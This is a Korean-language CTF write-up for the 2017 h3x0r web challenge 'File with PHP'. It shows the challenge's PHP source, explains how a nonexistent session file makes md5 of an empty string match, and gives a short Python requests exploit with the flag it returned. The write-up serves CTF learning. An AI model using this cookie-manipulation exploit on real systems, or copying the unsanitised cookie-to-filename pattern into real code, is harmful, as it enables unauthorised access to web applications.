# 2017 h3x0r - [WEB] File with PHP

## Key words

- $\_SESSION, $\_COOKIE
- (php) preg_match
- (php) unlink
- (php) NULL == "" (empty-string not \x00)

## Solution

문제에 접속하면 `Blank Page. LoL` 이라고만 뜨고 아무것도 뜨질 않습니다. 소스보기를 해보아도 별다른게 보이지 않아 `쿠키` 값을 확인해보았습니다.

확인 결과 해더 쿠키쪽에 다음과 같이 설정이 되어 있음을 볼 수 있습니다.

> Cookie:source=0; PHPSESSID=vpjjvib3sska8mgdglp3vg7in5

`PHPSESSID`는 PHP세션을 위해 존재하지만 `source`내용이 의심스럽습니다. 이 값을 `1`로 변경해보고 다시 요청하면 페이지에 문제 소스 코드가 나타나게 됩니다.

```php
<?php
    $flag = 1;
    include "config.php";

    $_SESSION[cookie] = $_COOKIE[PHPSESSID];

    if($_GET['mode']=="pwn") {

        $f=file("$_SESSION[cookie].txt");

        if(preg_match("/^$_SESSION[cookie]$/i", md5($f[0]))) {
            unlink("$_SESSION[cookie].txt");
            echo $flag;
        }

        $f = fopen(md5($_SESSION[cookie]).".txt", "w");
        fwrite($f,$_SESSION[cookie]);
        fclose($f);
        usleep(300000);
        unlink(md5($_SESSION[cookie]).".txt");
    }

    if($_COOKIE['source']) {
        show_source(__FILE__);
        exit();
    }

    setcookie('source', 0);
    echo "<h3> Blank Page. LoL </h3>";
?>
```

문제에서 제공된 소스의 첫 부분에 `$flag = 1`로 되어 있지만 실제로 서버에서는 달리 설정되어 있거나, `config.php`에서 정상적인 flag 값으로 설정하게 됩니다.

문제에서 flag를 얻는 플로우는 다음과 같습니다.

- $\_GET['mode']의 값이 `pwn`
- 유저가 요청한 쿠키의 `PHPSESSID`값을 읽어 $\_SESSION[cookie]에 저장한 뒤, `$\_SESSION[cookie].txt` 파일을 읽음
- 읽은 파일의 첫 번째 줄과 $\_SESSION[cookie]가 일치하게 되면 플래그를 출력

문제에서 로직적으로 버그가 생기는 부분은 처음에 세션을 사용자로부터 받고 파일을 읽었을 때, 해당 파일이 존재하지 않는 경우에 대해 처리가 안되어 있다는 점 입니다.

만약 쿠키 세션을 서버에 파일로 존재하지 않는 값으로 전달하게 되면 `$f[0]`의 값이 `null`이 되게 되고 결국 `md5(null)`과 제가 전달한 세션 값을 비교하고 동일한지 체크 하게 됩니다.

따라서, 쿠키의 세션값을 `md5(null)`로 만들어서 전달할 때 서버쪽에 해당 파일이 존재 하지 않는다면 플래그를 출력 할 것입니다.

한 가지 주의할 점은 `$f[0]`가 `NULL`값을 갖지만 널 값은 스페셜 문자로 사용되는 언어나 라이브러리에 따라서 달라 질 수 있습니다.

제공된 PHP 버전의 `NULL`값은 `Empty String`이기 때문에 `md5("")`로 해쉬를 해야 합니다.

## Code

```python
import requests
import hashlib

url = "http://13.124.93.183/h3x0rctf/d41d8cd98f00b204e9800998ecf8427e.php"

headers = { "Cookie": "PHPSESSID=" + hashlib.md5("").hexdigest() }
params  = { "mode": "pwn" }
r = requests.get(url, params=params, headers=headers)
print r.content

# result
# H3X0R{c65a4cb5ecf62bb0c995b7cd7b54db71}<h3> Blank Page. LoL </h3>
```
